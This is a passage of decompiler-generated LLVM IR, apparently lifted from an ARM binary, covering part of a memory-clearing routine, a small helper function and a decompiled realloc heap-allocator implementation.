  %v3_11414 = load i32, i32* %v2_11414, align 4
  %v1_11418 = and i32 %v3_11414, 2
  %v2_11418 = icmp eq i32 %v1_11418, 0
  br i1 %v2_11418, label %dec_label_pc_11420, label %.thread

dec_label_pc_11420:                               ; preds = %dec_label_pc_11414
  %v1_114206 = add i32 %v3_11414, -4
  %v1_11424 = and i32 %v1_114206, -4
  %v3_11428 = udiv i32 %v1_11424, 4
  store i32 %v3_11428, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_11424, 36
  %v2_11430 = icmp ult i32 %v1_11424, 33
  %v3_11430 = or i1 %tmp, %v2_11430
  br i1 %v3_11430, label %dec_label_pc_1143c, label %dec_label_pc_11434

dec_label_pc_11434:                               ; preds = %dec_label_pc_11420
  %v3_11434 = inttoptr i32 %v0_11408 to i8*
  %v4_11434 = call i32 @__GI_memset(i8* %v3_11434, i32 0, i32 %v1_11424)
  br label %.thread

dec_label_pc_1143c:                               ; preds = %dec_label_pc_11420
  %tmp7 = icmp eq i32 %v1_11424, 16
  %v2_11440 = inttoptr i32 %v0_11408 to i32*
  store i32 0, i32* %v2_11440, align 4
  %v1_11444 = load i32, i32* %r4.global-to-local, align 4
  %v2_11444 = add i32 %v1_11444, 4
  %v3_11444 = inttoptr i32 %v2_11444 to i32*
  store i32 0, i32* %v3_11444, align 4
  %v1_11448 = load i32, i32* %r4.global-to-local, align 4
  %v2_11448 = add i32 %v1_11448, 8
  %v3_11448 = inttoptr i32 %v2_11448 to i32*
  store i32 0, i32* %v3_11448, align 4
  %v2_1144c = icmp ult i32 %v1_11424, 13
  %v3_1144c = or i1 %tmp7, %v2_1144c
  br i1 %v3_1144c, label %.thread, label %dec_label_pc_11450

dec_label_pc_11450:                               ; preds = %dec_label_pc_1143c
  %v0_11450 = load i32, i32* %ip.global-to-local, align 4
  %v1_11454 = load i32, i32* %r4.global-to-local, align 4
  %v2_11454 = add i32 %v1_11454, 12
  %v3_11454 = inttoptr i32 %v2_11454 to i32*
  store i32 0, i32* %v3_11454, align 4
  %v1_11458 = load i32, i32* %r4.global-to-local, align 4
  %v2_11458 = add i32 %v1_11458, 16
  %v3_11458 = inttoptr i32 %v2_11458 to i32*
  store i32 0, i32* %v3_11458, align 4
  %tmp8 = icmp ult i32 %v0_11450, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_11460

dec_label_pc_11460:                               ; preds = %dec_label_pc_11450
  %v0_11460 = load i32, i32* %ip.global-to-local, align 4
  %v7_11460 = icmp eq i32 %v0_11460, 9
  %v1_11464 = load i32, i32* %r4.global-to-local, align 4
  %v2_11464 = add i32 %v1_11464, 20
  %v3_11464 = inttoptr i32 %v2_11464 to i32*
  store i32 0, i32* %v3_11464, align 4
  %v1_11468 = load i32, i32* %r4.global-to-local, align 4
  %v2_11468 = add i32 %v1_11468, 24
  %v3_11468 = inttoptr i32 %v2_11468 to i32*
  store i32 0, i32* %v3_11468, align 4
  br i1 %v7_11460, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11460
  %v2_1146c = load i32, i32* %r4.global-to-local, align 4
  %v3_1146c = add i32 %v2_1146c, 32
  %v4_1146c = inttoptr i32 %v3_1146c to i32*
  store i32 0, i32* %v4_1146c, align 4
  %v2_11470 = load i32, i32* %r4.global-to-local, align 4
  %v3_11470 = add i32 %v2_11470, 28
  %v4_11470 = inttoptr i32 %v3_11470 to i32*
  store i32 0, i32* %v4_11470, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11460, %dec_label_pc_11414, %dec_label_pc_11450, %dec_label_pc_1143c, %dec_label_pc_113c8, %dec_label_pc_11434, %bb
  store i32 1, i32* @r1, align 4
  %v0_11480 = load i32, i32* @r5, align 4
  %v2_11480 = add i32 %v0_11480, 44
  %v3_11480 = inttoptr i32 %v2_11480 to i32*
  %v4_11480 = load i32, i32* %v3_11480, align 4
  store i32 %v4_11480, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11480)
  br label %dec_label_pc_1148c

dec_label_pc_1148c:                               ; preds = %dec_label_pc_113ac, %.thread
  %v0_1148c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_11378, i32* @r4, align 4
  store i32 %v6_11378, i32* @r5, align 4
  store i32 %v9_11378, i32* @r6, align 4
  store i32 %v12_11378, i32* @lr, align 4
  ret i32 %v0_1148c

; uselistorder directives
  uselistorder i32 %v1_11424, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_11408, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 6, 2, 7, 3, 8, 4, 9, 5, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1148c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_114a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_114a4:
  %v0_114a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_114a4, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_114a4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_114a4, %bb
  %v4_114b4 = phi i32 [ %arg1, %dec_label_pc_114a4 ], [ 0, %bb ]
  ret i32 %v4_114b4

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_114b8 = load i32, i32* @r4, align 4
  %v6_114b8 = load i32, i32* @r5, align 4
  %v9_114b8 = load i32, i32* @r6, align 4
  %v12_114b8 = load i32, i32* @r7, align 4
  %v15_114b8 = load i32, i32* @r8, align 4
  %v18_114b8 = load i32, i32* @sb, align 4
  %v21_114b8 = load i32, i32* @sl, align 4
  %v24_114b8 = load i32, i32* @fp, align 4
  %v27_114b8 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_114c4 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_114c4, label %dec_label_pc_114d8, label %dec_label_pc_114e8

dec_label_pc_114d8:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_114dc = call i32 @malloc()
  store i32 %v0_114dc, i32* %r0.global-to-local, align 4
  store i32 %v0_114dc, i32* @r4, align 4
  br label %dec_label_pc_11848

dec_label_pc_114e8:                               ; preds = %entry
  %v2_114e8 = icmp eq i32 %arg2, 0
  br i1 %v2_114e8, label %dec_label_pc_114f0, label %dec_label_pc_114fc

dec_label_pc_114f0:                               ; preds = %dec_label_pc_114e8
  %v0_114f0 = call i32 @free()
  store i32 %v0_114f0, i32* %r0.global-to-local, align 4
  %v0_114f4 = load i32, i32* @r6, align 4
  store i32 %v0_114f4, i32* @r4, align 4
  br label %dec_label_pc_11848

dec_label_pc_114fc:                               ; preds = %dec_label_pc_114e8
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_11504 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 108) to i32*), align 4
  store i32 %v4_11504, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_11504, i32* %r2.global-to-local, align 4
  %v4_11510 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 68) to i32*), align 4
  store i32 %v4_11510, i32* %r1.global-to-local, align 4
  %v2_11514 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_11514, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_1151c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1151c)
  %v0_11528 = load i32, i32* @r4, align 4
  store i32 %v0_11528, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r1.global-to-local, align 4
  %v4_11534 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_11540.673 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11534)
  %v0_11540 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_11540, -32
  br i1 %tmp36, label %dec_label_pc_11564, label %dec_label_pc_11548

dec_label_pc_11548:                               ; preds = %dec_label_pc_114fc
  store i32 63508, i32* %r2.global-to-local, align 4
  %v0_1154c = call i32 @__aeabi_read_tp()
  store i32 %v0_1154c, i32* %r0.global-to-local, align 4
  %v3_11550 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_11550 = sext i16 %v3_11550 to i32
  store i32 %v4_11550, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_1155c = add i32 %v4_11550, %v0_1154c
  %v4_1155c = inttoptr i32 %v3_1155c to i32*
  store i32 12, i32* %v4_1155c, align 4
  br label %dec_label_pc_11848

dec_label_pc_11564:                               ; preds = %dec_label_pc_114fc
  %v1_11564 = add i32 %v0_11540, 11
  store i32 %v1_11564, i32* %r0.global-to-local, align 4
  %v0_11568 = load i32, i32* @r5, align 4
  %v1_11568 = add i32 %v0_11568, -4
  %v2_11568 = inttoptr i32 %v1_11568 to i32*
  %v3_11568 = load i32, i32* %v2_11568, align 4
  store i32 %v3_11568, i32* %r2.global-to-local, align 4
  %v2_1156c = icmp ugt i32 %v1_11564, 14
  %v7_1156c = icmp eq i32 %v1_11564, 15
  %v2_11570 = xor i1 %v2_1156c, true
  %v3_11570 = or i1 %v7_1156c, %v2_11570
  br i1 %v3_11570, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_11564
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_11564, %bb
  %v2_11574 = xor i1 %v7_1156c, true
  %v3_11574 = and i1 %v2_1156c, %v2_11574
  br i1 %v3_11574, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_11574 = and i32 %v1_11564, -8
  store i32 %v5_11574, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_11578 = and i32 %v3_11568, 2
  %v2_11578 = icmp eq i32 %v1_11578, 0
  %v1_1157c = add i32 %v0_11568, -8
  store i32 %v1_1157c, i32* @sl, align 4
  %v1_11580 = and i32 %v3_11568, -4
  store i32 %v1_11580, i32* @r6, align 4
  br i1 %v2_11578, label %dec_label_pc_11588, label %dec_label_pc_11760

dec_label_pc_11588:                               ; preds = %bb29
  %v1_11588 = load i32, i32* @sb, align 4
  %v3_11588 = icmp ult i32 %v1_11580, %v1_11588
  br i1 %v3_11588, label %dec_label_pc_11594, label %bb30

bb30:                                             ; preds = %dec_label_pc_11588
  store i32 %v1_11580, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_116f8

dec_label_pc_11594:                               ; preds = %dec_label_pc_11588
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1159c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  store i32 %v4_1159c, i32* %r0.global-to-local, align 4
  %v1_115a0 = add i32 %v4_1159c, 44
  %v2_115a0 = inttoptr i32 %v1_115a0 to i32*
  %v3_115a0 = load i32, i32* %v2_115a0, align 4
  store i32 %v3_115a0, i32* %r3.global-to-local, align 4
  %v2_115a4 = add i32 %v1_11580, %v1_1157c
  store i32 %v2_115a4, i32* @r4, align 4
  %v9_115a8 = icmp eq i32 %v2_115a4, %v3_115a0
  %v1_115ac = add i32 %v2_115a4, 4
  %v2_115ac = inttoptr i32 %v1_115ac to i32*
  %v3_115ac = load i32, i32* %v2_115ac, align 4
  store i32 %v3_115ac, i32* %r1.global-to-local, align 4
  br i1 %v9_115a8, label %dec_label_pc_115b4, label %dec_label_pc_115f0

dec_label_pc_115b4:                               ; preds = %dec_label_pc_11594
  %v1_115b4 = and i32 %v3_115ac, -4
  %v2_115b8 = add i32 %v1_115b4, %v1_11580
  store i32 %v2_115b8, i32* %r1.global-to-local, align 4
  %v1_115bc = add i32 %v1_11588, 16
  store i32 %v1_115bc, i32* %r3.global-to-local, align 4
  %v3_115c0 = icmp ult i32 %v2_115b8, %v1_115bc
  br i1 %v3_115c0, label %dec_label_pc_11644, label %dec_label_pc_115c8

dec_label_pc_115c8:                               ; preds = %dec_label_pc_115b4
  %v2_115c8 = sub i32 %v2_115b8, %v1_11588
  %v1_115cc = urem i32 %v3_11568, 2
  %v2_115d0 = add i32 %v1_11588, %v1_1157c
  store i32 %v2_115d0, i32* %r1.global-to-local, align 4
  %v2_115d4 = or i32 %v1_11588, %v1_115cc
  store i32 %v2_115d4, i32* %r2.global-to-local, align 4
  %v1_115d8 = or i32 %v2_115c8, 1
  store i32 %v1_115d8, i32* %r3.global-to-local, align 4
  store i32 %v0_11568, i32* @r4, align 4
  store i32 %v2_115d4, i32* %v2_11568, align 4
  %v0_115e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_115e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_115e4 = add i32 %v1_115e4, 44
  %v3_115e4 = inttoptr i32 %v2_115e4 to i32*
  store i32 %v0_115e4, i32* %v3_115e4, align 4
  %v0_115e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_115e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_115e8 = add i32 %v1_115e8, 4
  %v3_115e8 = inttoptr i32 %v2_115e8 to i32*
  store i32 %v0_115e8, i32* %v3_115e8, align 4
  br label %dec_label_pc_1182c

dec_label_pc_115f0:                               ; preds = %dec_label_pc_11594
  %v1_115f0 = and i32 %v3_115ac, -2
  %v2_115f4 = add i32 %v1_115f0, %v2_115a4
  store i32 %v2_115f4, i32* %r3.global-to-local, align 4
  %v1_115f8 = add i32 %v2_115f4, 4
  %v2_115f8 = inttoptr i32 %v1_115f8 to i32*
  %v3_115f8 = load i32, i32* %v2_115f8, align 4
  store i32 %v3_115f8, i32* %r3.global-to-local, align 4
  %v1_115fc = urem i32 %v3_115f8, 2
  %v2_115fc = icmp eq i32 %v1_115fc, 0
  br i1 %v2_115fc, label %dec_label_pc_11604, label %dec_label_pc_11644

dec_label_pc_11604:                               ; preds = %dec_label_pc_115f0
  %v1_11604 = and i32 %v3_115ac, -4
  store i32 %v1_11604, i32* %r3.global-to-local, align 4
  %v2_11608 = add i32 %v1_11604, %v1_11580
  store i32 %v2_11608, i32* %r0.global-to-local, align 4
  %v3_1160c = icmp ult i32 %v2_11608, %v1_11588
  br i1 %v3_1160c, label %dec_label_pc_11644, label %dec_label_pc_11614

dec_label_pc_11614:                               ; preds = %dec_label_pc_11604
  %v1_11614 = add i32 %v1_11580, %v0_11568
  %v2_11614 = inttoptr i32 %v1_11614 to i32*
  %v3_11614 = load i32, i32* %v2_11614, align 4
  store i32 %v3_11614, i32* %r1.global-to-local, align 4
  %v1_11618 = add i32 %v3_11614, 12
  %v2_11618 = inttoptr i32 %v1_11618 to i32*
  %v3_11618 = load i32, i32* %v2_11618, align 4
  store i32 %v3_11618, i32* %r3.global-to-local, align 4
  %v9_1161c = icmp eq i32 %v3_11618, %v2_115a4
  %v1_11620 = add i32 %v2_115a4, 12
  %v2_11620 = inttoptr i32 %v1_11620 to i32*
  %v3_11620 = load i32, i32* %v2_11620, align 4
  store i32 %v3_11620, i32* %r2.global-to-local, align 4
  br i1 %v9_1161c, label %dec_label_pc_11628, label %dec_label_pc_11634

dec_label_pc_11628:                               ; preds = %dec_label_pc_11614
  %v1_11628 = add i32 %v3_11620, 8
  %v2_11628 = inttoptr i32 %v1_11628 to i32*
  %v3_11628 = load i32, i32* %v2_11628, align 4
  store i32 %v3_11628, i32* %r3.global-to-local, align 4
  %v9_1162c = icmp eq i32 %v3_11628, %v2_115a4
  br i1 %v9_1162c, label %dec_label_pc_11638, label %dec_label_pc_11634

dec_label_pc_11634:                               ; preds = %dec_label_pc_11614, %dec_label_pc_11628
  %v0_11634 = call i32 @abort()
  store i32 %v0_11634, i32* %r0.global-to-local, align 4
  %v0_11638.pre = load i32, i32* @r1, align 4
  %v1_11638.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_11638

dec_label_pc_11638:                               ; preds = %dec_label_pc_11628, %dec_label_pc_11634
  %v1_11638 = phi i32 [ %v3_11620, %dec_label_pc_11628 ], [ %v1_11638.pre, %dec_label_pc_11634 ]
  %v0_11638 = phi i32 [ %v3_11614, %dec_label_pc_11628 ], [ %v0_11638.pre, %dec_label_pc_11634 ]
  %v2_11638 = add i32 %v1_11638, 8
  %v3_11638 = inttoptr i32 %v2_11638 to i32*
  store i32 %v0_11638, i32* %v3_11638, align 4
  %v0_1163c = load i32, i32* %r2.global-to-local, align 4
  %v1_1163c = load i32, i32* %r1.global-to-local, align 4
  %v2_1163c = add i32 %v1_1163c, 12
  %v3_1163c = inttoptr i32 %v2_1163c to i32*
  store i32 %v0_1163c, i32* %v3_1163c, align 4
  %v1_116f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_116f8

dec_label_pc_11644:                               ; preds = %dec_label_pc_115b4, %dec_label_pc_11604, %dec_label_pc_115f0
  %v1_11644 = add i32 %v1_11588, -7
  store i32 %v1_11644, i32* @r0, align 4
  %v0_11648 = call i32 @malloc()
  store i32 %v0_11648, i32* @r0, align 4
  store i32 %v0_11648, i32* %r1.global-to-local, align 4
  %v2_1164c = icmp eq i32 %v0_11648, 0
  br i1 %v2_1164c, label %bb31, label %dec_label_pc_11658

bb31:                                             ; preds = %dec_label_pc_11644
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1182c

dec_label_pc_11658:                               ; preds = %dec_label_pc_11644
  %v1_11660.pre = load i32, i32* @r4, align 4
  %v1_11658 = add i32 %v0_11648, -4
  %v2_11658 = inttoptr i32 %v1_11658 to i32*
  %v3_11658 = load i32, i32* %v2_11658, align 4
  store i32 %v3_11658, i32* @r3, align 4
  %v1_1165c = add i32 %v0_11648, -8
  store i32 %v1_1165c, i32* @r7, align 4
  %v9_11660 = icmp eq i32 %v1_1165c, %v1_11660.pre
  br i1 %v9_11660, label %.thread2, label %dec_label_pc_11670

.thread2:                                         ; preds = %dec_label_pc_11658
  %v2_11664 = and i32 %v3_11658, -4
  store i32 %v2_11664, i32* %r3.global-to-local, align 4
  %v2_11668 = load i32, i32* @r6, align 4
  %v3_11668 = add i32 %v2_11668, %v2_11664
  store i32 %v3_11668, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_116f8

dec_label_pc_11670:                               ; preds = %dec_label_pc_11658
  %v0_11670 = load i32, i32* @r6, align 4
  %v1_11670 = add i32 %v0_11670, -4
  store i32 %v1_11670, i32* @r2, align 4
  %v3_11674 = udiv i32 %v1_11670, 4
  store i32 %v3_11674, i32* @ip, align 4
  %tmp37 = and i32 %v1_11670, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_1167c = icmp ult i32 %v1_11670, 36
  %v3_1167c = or i1 %tmp38, %v2_1167c
  %v0_1168c = load i32, i32* @r5, align 4
  br i1 %v3_1167c, label %dec_label_pc_1168c, label %dec_label_pc_11680

dec_label_pc_11680:                               ; preds = %dec_label_pc_11670
  store i32 %v0_1168c, i32* @r1, align 4
  %v0_11684 = call i32 @memcpy()
  store i32 %v0_11684, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1168c:                               ; preds = %dec_label_pc_11670
  %v1_1168c = inttoptr i32 %v0_1168c to i32*
  %v2_1168c = load i32, i32* %v1_1168c, align 4
  store i32 %v2_1168c, i32* %r3.global-to-local, align 4
  %v2_11690 = inttoptr i32 %v0_11648 to i32*
  store i32 %v2_1168c, i32* %v2_11690, align 4
  %v0_11694 = load i32, i32* @r5, align 4
  %v1_11694 = add i32 %v0_11694, 4
  %v2_11694 = inttoptr i32 %v1_11694 to i32*
  %v3_11694 = load i32, i32* %v2_11694, align 4
  store i32 %v3_11694, i32* %r3.global-to-local, align 4
  %v1_11698 = load i32, i32* %r1.global-to-local, align 4
  %v2_11698 = add i32 %v1_11698, 4
  %v3_11698 = inttoptr i32 %v2_11698 to i32*
  store i32 %v3_11694, i32* %v3_11698, align 4
  %v0_1169c = load i32, i32* @r5, align 4
  %v1_1169c = add i32 %v0_1169c, 8
  %v2_1169c = inttoptr i32 %v1_1169c to i32*
  %v3_1169c = load i32, i32* %v2_1169c, align 4
  store i32 %v3_1169c, i32* %r3.global-to-local, align 4
  %v0_116a0 = load i32, i32* @ip, align 4
  %v1_116a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_116a4 = add i32 %v1_116a4, 8
  %v3_116a4 = inttoptr i32 %v2_116a4 to i32*
  store i32 %v3_1169c, i32* %v3_116a4, align 4
  %tmp39 = icmp ult i32 %v0_116a0, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_116ac

dec_label_pc_116ac:                               ; preds = %dec_label_pc_1168c
  %v0_116ac = load i32, i32* @r5, align 4
  %v1_116ac = add i32 %v0_116ac, 12
  %v2_116ac = inttoptr i32 %v1_116ac to i32*
  %v3_116ac = load i32, i32* %v2_116ac, align 4
  store i32 %v3_116ac, i32* %r3.global-to-local, align 4
  %v1_116b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_116b0 = add i32 %v1_116b0, 12
  %v3_116b0 = inttoptr i32 %v2_116b0 to i32*
  store i32 %v3_116ac, i32* %v3_116b0, align 4
  %v0_116b4 = load i32, i32* @r5, align 4
  %v1_116b4 = add i32 %v0_116b4, 16
  %v2_116b4 = inttoptr i32 %v1_116b4 to i32*
  %v3_116b4 = load i32, i32* %v2_116b4, align 4
  store i32 %v3_116b4, i32* %r3.global-to-local, align 4
  %v0_116b8 = load i32, i32* @ip, align 4
  %v1_116bc = load i32, i32* %r1.global-to-local, align 4
  %v2_116bc = add i32 %v1_116bc, 16
  %v3_116bc = inttoptr i32 %v2_116bc to i32*
  store i32 %v3_116b4, i32* %v3_116bc, align 4
  %tmp40 = icmp ult i32 %v0_116b8, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_116c4

dec_label_pc_116c4:                               ; preds = %dec_label_pc_116ac
  %v0_116c4 = load i32, i32* @r5, align 4
  %v1_116c4 = add i32 %v0_116c4, 20
  %v2_116c4 = inttoptr i32 %v1_116c4 to i32*
  %v3_116c4 = load i32, i32* %v2_116c4, align 4
  store i32 %v3_116c4, i32* %r3.global-to-local, align 4
  %v1_116c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_116c8 = add i32 %v1_116c8, 20
  %v3_116c8 = inttoptr i32 %v2_116c8 to i32*
  store i32 %v3_116c4, i32* %v3_116c8, align 4
  %v0_116cc = load i32, i32* @r5, align 4
  %v1_116cc = add i32 %v0_116cc, 24
  %v2_116cc = inttoptr i32 %v1_116cc to i32*
  %v3_116cc = load i32, i32* %v2_116cc, align 4
  store i32 %v3_116cc, i32* %r3.global-to-local, align 4
  %v1_116d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_116d0 = add i32 %v1_116d0, 24
  %v3_116d0 = inttoptr i32 %v2_116d0 to i32*
  store i32 %v3_116cc, i32* %v3_116d0, align 4
  %v0_116d4 = load i32, i32* @ip, align 4
  %v7_116d4 = icmp eq i32 %v0_116d4, 9
  br i1 %v7_116d4, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_116c4
  %v1_116d8 = load i32, i32* @r5, align 4
  %v2_116d8 = add i32 %v1_116d8, 28
  %v3_116d8 = inttoptr i32 %v2_116d8 to i32*
  %v4_116d8 = load i32, i32* %v3_116d8, align 4
  store i32 %v4_116d8, i32* %r3.global-to-local, align 4
  %v2_116dc = load i32, i32* %r1.global-to-local, align 4
  %v3_116dc = add i32 %v2_116dc, 28
  %v4_116dc = inttoptr i32 %v3_116dc to i32*
  store i32 %v4_116d8, i32* %v4_116dc, align 4
  %v1_116e0 = load i32, i32* @r5, align 4
  %v2_116e0 = add i32 %v1_116e0, 32
  %v3_116e0 = inttoptr i32 %v2_116e0 to i32*
  %v4_116e0 = load i32, i32* %v3_116e0, align 4
  store i32 %v4_116e0, i32* %r3.global-to-local, align 4
  %v2_116e4 = load i32, i32* %r1.global-to-local, align 4
  %v3_116e4 = add i32 %v2_116e4, 32
  %v4_116e4 = inttoptr i32 %v3_116e4 to i32*
  store i32 %v4_116e0, i32* %v4_116e4, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_116c4, %dec_label_pc_116ac, %dec_label_pc_1168c, %dec_label_pc_11680, %bb32
  %v0_116e8 = load i32, i32* @r5, align 4
  store i32 %v0_116e8, i32* @r0, align 4
  %v0_116ec = call i32 @free()
  store i32 %v0_116ec, i32* %r0.global-to-local, align 4
  %v0_116f0 = load i32, i32* @r7, align 4
  %v1_116f0 = add i32 %v0_116f0, 8
  store i32 %v1_116f0, i32* @r4, align 4
  br label %dec_label_pc_1182c

dec_label_pc_116f8:                               ; preds = %bb30, %.thread2, %dec_label_pc_11638
  %v0_1170c = phi i32 [ %v3_11668, %.thread2 ], [ %v1_11580, %bb30 ], [ %v1_116f8.pre, %dec_label_pc_11638 ]
  %v0_116f8 = load i32, i32* @sb, align 4
  %v2_116f8 = sub i32 %v0_1170c, %v0_116f8
  store i32 %v2_116f8, i32* %r1.global-to-local, align 4
  %v0_11700 = load i32, i32* @sl, align 4
  %v1_11700 = add i32 %v0_11700, 4
  %v2_11700 = inttoptr i32 %v1_11700 to i32*
  %v3_11700 = load i32, i32* %v2_11700, align 4
  %tmp41 = icmp ugt i32 %v2_116f8, 15
  %v1_11728 = urem i32 %v3_11700, 2
  store i32 %v1_11728, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_11728, label %dec_label_pc_11708

dec_label_pc_11708:                               ; preds = %dec_label_pc_116f8
  %v2_1170c = or i32 %v1_11728, %v0_1170c
  store i32 %v2_1170c, i32* %r3.global-to-local, align 4
  store i32 %v2_1170c, i32* %v2_11700, align 4
  %v0_11714 = load i32, i32* @sl, align 4
  %v1_11714 = load i32, i32* %r0.global-to-local, align 4
  %v2_11714 = add i32 %v1_11714, %v0_11714
  store i32 %v2_11714, i32* %r2.global-to-local, align 4
  %v1_11718 = add i32 %v2_11714, 4
  %v2_11718 = inttoptr i32 %v1_11718 to i32*
  %v3_11718 = load i32, i32* %v2_11718, align 4
  %v1_1171c = or i32 %v3_11718, 1
  store i32 %v1_1171c, i32* %r3.global-to-local, align 4
  store i32 %v1_1171c, i32* %v2_11718, align 4
  br label %dec_label_pc_11758

dec_label_pc_11728:                               ; preds = %dec_label_pc_116f8
  %v2_1172c = add i32 %v0_11700, %v0_116f8
  store i32 %v2_1172c, i32* %r0.global-to-local, align 4
  %v2_11730 = or i32 %v1_11728, %v0_116f8
  store i32 %v2_11730, i32* %r3.global-to-local, align 4
  %v1_11734 = or i32 %v2_116f8, 1
  store i32 %v1_11734, i32* %r2.global-to-local, align 4
  store i32 %v2_11730, i32* %v2_11700, align 4
  %v0_1173c = load i32, i32* %r2.global-to-local, align 4
  %v1_1173c = load i32, i32* %r0.global-to-local, align 4
  %v2_1173c = add i32 %v1_1173c, 4
  %v3_1173c = inttoptr i32 %v2_1173c to i32*
  store i32 %v0_1173c, i32* %v3_1173c, align 4
  %v0_11740 = load i32, i32* %r0.global-to-local, align 4
  %v1_11740 = load i32, i32* %r1.global-to-local, align 4
  %v2_11740 = add i32 %v1_11740, %v0_11740
  store i32 %v2_11740, i32* %r2.global-to-local, align 4
  %v1_11744 = add i32 %v2_11740, 4
  %v2_11744 = inttoptr i32 %v1_11744 to i32*
  %v3_11744 = load i32, i32* %v2_11744, align 4
  %v1_11748 = or i32 %v3_11744, 1
  store i32 %v1_11748, i32* %r3.global-to-local, align 4
  store i32 %v1_11748, i32* %v2_11744, align 4
  %v0_11750 = load i32, i32* %r0.global-to-local, align 4
  %v1_11750 = add i32 %v0_11750, 8
  store i32 %v1_11750, i32* @r0, align 4
  %v0_11754 = call i32 @free()
  store i32 %v0_11754, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11758

dec_label_pc_11758:                               ; preds = %dec_label_pc_11708, %dec_label_pc_11728
  %v0_11758 = load i32, i32* @sl, align 4
  %v1_11758 = add i32 %v0_11758, 8
  store i32 %v1_11758, i32* @r4, align 4
  br label %dec_label_pc_1182c

dec_label_pc_11760:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r1.global-to-local, align 4
  %v4_11768 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  store i32 %v4_11768, i32* @r8, align 4
  %v2_1176c = inttoptr i32 %v1_1157c to i32*
  %v3_1176c = load i32, i32* %v2_1176c, align 4
  store i32 %v3_1176c, i32* @r4, align 4
  %v1_11770 = add i32 %v4_11768, 860
  %v2_11770 = inttoptr i32 %v1_11770 to i32*
  %v3_11770 = load i32, i32* %v2_11770, align 4
